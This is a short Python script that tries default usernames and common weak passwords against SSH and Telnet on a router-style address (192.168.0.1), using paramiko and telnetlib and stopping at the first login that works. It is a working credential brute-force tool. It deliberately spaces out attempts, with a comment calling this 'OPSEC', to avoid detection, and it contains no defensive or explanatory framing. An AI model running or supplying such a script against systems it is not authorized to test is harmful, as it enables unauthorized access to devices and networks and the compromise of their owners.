import paramiko
import telnetlib
import time
import sys

TARGET = "192.168.0.1"
USERS = ["admin", "root"]
PASSWORDS = ["admin", "root", "password", "1234", "123456", ""]
DELAY = 6  # Seconds between attempts for OPSEC

def test_ssh(user, password):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(TARGET, port=22, username=user, password=password, timeout=5, banner_timeout=5)
        print(f"[+] SSH SUCCESS: {user}:{password}")
        client.close()
        return True
    except paramiko.AuthenticationException:
        return False
    except Exception as e:
        print(f"[-] SSH Error ({user}:{password}): {e}")
        return False

def test_telnet(user, password):
    try:
        tn = telnetlib.Telnet(TARGET, 23, timeout=5)
        tn.read_until(b"login: ", timeout=3)
        tn.write(user.encode('ascii') + b"\n")
        
        if password:
            tn.read_until(b"Password: ", timeout=3)
            tn.write(password.encode('ascii') + b"\n")
        
        res = tn.expect([b"#", b"%", b">", b"\\$"], timeout=3)
        if res[0] != -1:
            print(f"[+] Telnet SUCCESS: {user}:{password}")
            tn.close()
            return True
        tn.close()
        return False
    except Exception as e:
        return False

print("[*] Starting slow credential testing...")
for user in USERS:
    for pwd in PASSWORDS:
        print(f"[*] Testing {user}:{pwd}...")
        
        if test_ssh(user, pwd):
            sys.exit(0)
            
        time.sleep(DELAY / 2) # Stagger SSH and Telnet
        
        if test_telnet(user, pwd):
            sys.exit(0)
            
        time.sleep(DELAY / 2)

print("[-] No default credentials found.")